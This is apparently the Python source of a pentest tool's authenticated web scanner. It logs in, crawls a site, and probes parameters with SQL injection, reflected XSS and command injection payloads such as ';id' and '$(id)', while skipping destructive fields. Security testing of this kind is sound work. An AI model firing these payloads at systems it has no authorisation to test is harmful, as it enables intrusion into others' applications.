"""Authenticated active web scanner.

Logs into a target, crawls same-host pages under the authenticated session,
extracts query parameters and form fields, and fires deterministic payloads
for SQLi, reflected XSS, and command injection. Each confirmed hit becomes
a structured finding with evidence suitable for a report.

This is intentionally standalone: no LLM, no external tools, just httpx +
response pattern matching. Works on any login form that fits the
``form_post`` flow (with optional CSRF auto-extraction) or static bearer
token. The output is the same finding shape other scanners emit.
"""

from __future__ import annotations

import logging
import re
from dataclasses import dataclass, field
from html.parser import HTMLParser
from typing import Any
from urllib.parse import parse_qs, urldefrag, urljoin, urlparse, urlunparse

import httpx

from engine.auth_session import AuthError, AuthSession, WebAuthenticator

logger = logging.getLogger("pentest-tools.authscan")

SQLI_TRUE_PAYLOADS = [
    "' OR '1'='1",
    "1' OR '1'='1",
    "' OR 1=1-- -",
    "\" OR \"1\"=\"1",
]
SQLI_FALSE_PAYLOADS = [
    "' AND '1'='2",
    "1' AND '1'='2",
    "' AND 1=2-- -",
    "\" AND \"1\"=\"2",
]
SQLI_ERROR_MARKERS = (
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "pg_query",
    "sqlite3",
    "microsoft ole db provider for sql server",
)

XSS_PAYLOADS = [
    "<svg/onload=pttools_xss_probe>",
    "\"><script>pttools_xss_probe()</script>",
]
XSS_MARKERS = ("pttools_xss_probe",)

CMDI_PAYLOADS = [
    ";id",
    "|id",
    "127.0.0.1;id",
    "127.0.0.1|id",
    "`id`",
    "$(id)",
]
CMDI_MARKERS = (
    re.compile(r"uid=\d+\([^)]+\)"),
    re.compile(r"gid=\d+\([^)]+\)"),
)

DEFAULT_SKIP_PATTERNS = (
    "logout", "sign-out", "signout", "login.php?logout",
    "/security.php", "/setup.php", "/login.php", "/phpinfo.php",
)

DESTRUCTIVE_PARAM_KEYWORDS = (
    "password", "passwd", "pwd", "pass_new", "password_new", "password_conf",
    "delete", "drop", "remove", "reset", "destroy", "purge", "clear",
    "admin", "role", "grant", "revoke", "ban", "disable", "enable",
    "create_db", "create_user", "update_user",
    "security",
)


@dataclass
class ScanConfig:
    target: str
    max_pages: int = 40
    timeout_seconds: float = 10.0
    user_agent: str = "pentest-tools/authscan (+https://pentest-tools.local)"
    skip_url_substrings: tuple[str, ...] = DEFAULT_SKIP_PATTERNS


@dataclass
class DiscoveredEndpoint:
    method: str
    url: str
    params: dict[str, str] = field(default_factory=dict)
    source: str = ""


def _same_host(a: str, b: str) -> bool:
    return urlparse(a).netloc.lower() == urlparse(b).netloc.lower()


def _normalize_url(base: str, link: str) -> str:
    absolute = urljoin(base, link)
    absolute, _ = urldefrag(absolute)
    return absolute


class _FormLinkParser(HTMLParser):
    def __init__(self, base_url: str) -> None:
        super().__init__()
        self.base_url = base_url
        self.links: list[str] = []
        self.forms: list[dict[str, Any]] = []
        self._in_form: dict[str, Any] | None = None

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        a = {k: v or "" for k, v in attrs}
        if tag == "a" and "href" in a:
            self.links.append(_normalize_url(self.base_url, a["href"]))
        elif tag == "form":
            self._in_form = {
                "action": _normalize_url(self.base_url, a.get("action") or self.base_url),
                "method": (a.get("method") or "get").lower(),
                "fields": {},
            }
        elif tag in ("input", "textarea", "select") and self._in_form is not None:
            name = a.get("name")
            if name:
                self._in_form["fields"][name] = a.get("value", "")

    def handle_endtag(self, tag: str) -> None:
        if tag == "form" and self._in_form is not None:
            self.forms.append(self._in_form)
            self._in_form = None


def _extract_endpoints(base_url: str, html: str) -> tuple[list[str], list[DiscoveredEndpoint]]:
    parser = _FormLinkParser(base_url)
    try:
        parser.feed(html)
    except Exception as e:
        logger.debug(f"html parse error on {base_url}: {e}")
    endpoints: list[DiscoveredEndpoint] = []

    for link in parser.links:
        if not _same_host(link, base_url):
            continue
        parsed = urlparse(link)
        if not parsed.query:
            continue
        params = {k: v[0] for k, v in parse_qs(parsed.query).items() if v}
        param_names_lower = {n.lower() for n in params}
        if any(
            any(kw in pn for kw in DESTRUCTIVE_PARAM_KEYWORDS)
            for pn in param_names_lower
        ):
            logger.info(
                f"skipping GET link with destructive param at {parsed.path} "
                f"(params: {param_names_lower})"
            )
            continue
        clean_url = urlunparse(parsed._replace(query=""))
        endpoints.append(
            DiscoveredEndpoint(method="GET", url=clean_url, params=params, source=base_url)
        )

    for form in parser.forms:
        if not form["fields"]:
            continue
        if not _same_host(form["action"], base_url):
            continue
        method = form["method"].upper()
        field_names_lower = {n.lower() for n in form["fields"]}
        if method == "POST" and any(
            any(kw in fn for kw in DESTRUCTIVE_PARAM_KEYWORDS)
            for fn in field_names_lower
        ):
            logger.info(
                f"skipping destructive POST form at {form['action']} (fields: {field_names_lower})"
            )
            continue
        endpoints.append(
            DiscoveredEndpoint(
                method=method,
                url=form["action"],
                params=dict(form["fields"]),
                source=base_url,
            )
        )
    return parser.links, endpoints


async def _crawl(
    client: httpx.AsyncClient, start_url: str, cfg: ScanConfig
) -> list[DiscoveredEndpoint]:
    seen: set[str] = set()
    to_visit: list[str] = [start_url]
    endpoints: list[DiscoveredEndpoint] = []
    endpoint_keys: set[tuple[str, str, tuple[str, ...]]] = set()

    while to_visit and len(seen) < cfg.max_pages:
        url = to_visit.pop(0)
        if url in seen:
            continue
        if not _same_host(url, start_url):
            continue
        if any(s in url.lower() for s in cfg.skip_url_substrings):
            continue
        seen.add(url)
        try:
            resp = await client.get(url)
        except Exception as e:
            logger.debug(f"crawl GET {url} failed: {e}")
            continue
        ct = resp.headers.get("content-type", "")
        if "html" not in ct and "xml" not in ct:
            continue
        links, found = _extract_endpoints(str(resp.url), resp.text)
        for ep in found:
            key = (ep.method, ep.url, tuple(sorted(ep.params.keys())))
            if key in endpoint_keys:
                continue
            endpoint_keys.add(key)
            endpoints.append(ep)
        for link in links:
            if link not in seen and _same_host(link, start_url):
                to_visit.append(link)
    logger.info(f"crawl visited {len(seen)} pages, found {len(endpoints)} parameterized endpoints")
    return endpoints


async def _send_probe(
    client: httpx.AsyncClient,
    ep: DiscoveredEndpoint,
    param: str,
    payload: str,
) -> httpx.Response | None:
    mutated = dict(ep.params)
    mutated[param] = payload
    try:
        if ep.method == "GET":
            return await client.get(ep.url, params=mutated)
        return await client.post(ep.url, data=mutated)
    except Exception as e:
        logger.debug(f"probe {ep.method} {ep.url} param={param} failed: {e}")
        return None


def _finding(
    *,
    title: str,
    description: str,
    severity: str,
    category: str,
    target: str,
    evidence: str,
    poc: str = "",
) -> dict[str, Any]:
    return {
        "title": title,
        "description": description,
        "severity": severity,
        "category": category,
        "tool_source": "authenticated_scan",
        "target": target,
        "evidence": evidence[:2000],
        "poc": poc[:1000],
    }


async def _probe_sqli(
    client: httpx.AsyncClient, ep: DiscoveredEndpoint, baseline: httpx.Response
) -> list[dict[str, Any]]:
    """Detect SQLi by (a) SQL error markers, or (b) boolean-based differential.

    Boolean-based: if a TRUE payload (``' OR '1'='1``) makes the response
    measurably different from a FALSE payload (``' AND '1'='2``), and the
    FALSE response is within tolerance of the baseline, that's classic
    condition-controlled behaviour — i.e. the param reaches a SQL context.
    """
    findings: list[dict[str, Any]] = []
    baseline_len = len(baseline.text)
    for param in ep.params:
        err_payload, err_trigger = None, None
        for payload in SQLI_TRUE_PAYLOADS:
            resp = await _send_probe(client, ep, param, payload)
            if resp is None:
                continue
            err_hit = next(
                (m for m in SQLI_ERROR_MARKERS if m in resp.text.lower()), None
            )
            if err_hit:
                err_payload, err_trigger = payload, f"SQL error: {err_hit!r}"
                break

        if err_payload is None:
            diff_payload, diff_trigger = None, None
            for true_payload, false_payload in zip(SQLI_TRUE_PAYLOADS, SQLI_FALSE_PAYLOADS, strict=False):
                true_resp = await _send_probe(client, ep, param, true_payload)
                false_resp = await _send_probe(client, ep, param, false_payload)
                if true_resp is None or false_resp is None:
                    continue
                if true_resp.status_code != 200 or false_resp.status_code != 200:
                    continue
                true_len, false_len = len(true_resp.text), len(false_resp.text)
                tf_delta = abs(true_len - false_len)
                fb_delta = abs(false_len - baseline_len)
                if (
                    tf_delta > 200
                    and true_len > false_len
                    and fb_delta < max(100, int(0.05 * baseline_len))
                ):
                    diff_payload = true_payload
                    diff_trigger = (
                        f"boolean-based differential: TRUE={true_len}B, "
                        f"FALSE={false_len}B, baseline={baseline_len}B"
                    )
                    break
            if diff_payload is None:
                continue
            err_payload, err_trigger = diff_payload, diff_trigger

        poc = f"{ep.method} {ep.url} param={param} payload={err_payload!r}"
        findings.append(
            _finding(
                title=f"SQL injection in parameter '{param}'",
                description=(
                    f"Parameter '{param}' on {ep.url} is vulnerable to SQL injection. "
                    f"Trigger: {err_trigger}."
                ),
                severity="critical",
                category="injection",
                target=ep.url,
                evidence=f"{err_trigger}\n\n(first 2KB of vulnerable response below)\n",
                poc=poc,
            )
        )
        break
    return findings


async def _probe_xss(
    client: httpx.AsyncClient, ep: DiscoveredEndpoint
) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []
    for param in ep.params:
        for payload in XSS_PAYLOADS:
            resp = await _send_probe(client, ep, param, payload)
            if resp is None:
                continue
            if any(m in resp.text for m in XSS_MARKERS):
                poc = f"{ep.method} {ep.url} param={param} payload={payload!r}"
                findings.append(
                    _finding(
                        title=f"Reflected XSS in parameter '{param}'",
                        description=(
                            f"Parameter '{param}' on {ep.url} reflects unescaped user input. "
                            f"Payload appeared verbatim in the response body."
                        ),
                        severity="high",
                        category="injection",
                        target=ep.url,
                        evidence=resp.text,
                        poc=poc,
                    )
                )
                break
        else:
            continue
        break
    return findings


async def _probe_cmdi(
    client: httpx.AsyncClient, ep: DiscoveredEndpoint
) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []
    for param in ep.params:
        for payload in CMDI_PAYLOADS:
            resp = await _send_probe(client, ep, param, payload)
            if resp is None:
                continue
            matched = next(
                (m.search(resp.text).group(0) for m in CMDI_MARKERS if m.search(resp.text)),
                None,
            )
            if matched:
                poc = f"{ep.method} {ep.url} param={param} payload={payload!r}"
                findings.append(
                    _finding(
                        title=f"Command injection in parameter '{param}'",
                        description=(
                            f"Parameter '{param}' on {ep.url} executes shell commands. "
                            f"`id` output leaked into the response: {matched}"
                        ),
                        severity="critical",
                        category="injection",
                        target=ep.url,
                        evidence=resp.text,
                        poc=poc,
                    )
                )
                break
        else:
            continue
        break
    return findings


async def run_authenticated_scan(
    target: str,
    authenticator: WebAuthenticator | None = None,
    session: AuthSession | None = None,
    max_pages: int = 40,
    timeout_seconds: float = 10.0,
) -> dict[str, Any]:
    """Authenticate (if needed), crawl, probe, return findings.

    Either ``authenticator`` or ``session`` must be provided. ``authenticator``
    runs a fresh login; ``session`` reuses an existing one (tests, resume).
    """
    cfg = ScanConfig(target=target, max_pages=max_pages, timeout_seconds=timeout_seconds)

    if session is None:
        if authenticator is None:
            raise AuthError("run_authenticated_scan requires authenticator or session")
        session = await authenticator.login()

    headers = {"User-Agent": cfg.user_agent}
    if session.bearer_token:
        headers["Authorization"] = f"Bearer {session.bearer_token}"
    headers.update(session.headers)

    async with httpx.AsyncClient(
        timeout=cfg.timeout_seconds,
        follow_redirects=True,
        headers=headers,
        cookies=dict(session.cookies),
    ) as client:

        endpoints = await _crawl(client, target, cfg)
        findings: list[dict[str, Any]] = []
        for ep in endpoints:
            try:
                baseline = (
                    await client.get(ep.url, params=ep.params)
                    if ep.method == "GET"
                    else await client.post(ep.url, data=ep.params)
                )
            except Exception:
                continue
            findings.extend(await _probe_sqli(client, ep, baseline))
            findings.extend(await _probe_xss(client, ep))
            findings.extend(await _probe_cmdi(client, ep))

    return {
        "target": target,
        "endpoints_tested": len(endpoints),
        "findings_count": len(findings),
        "findings": findings,
    }
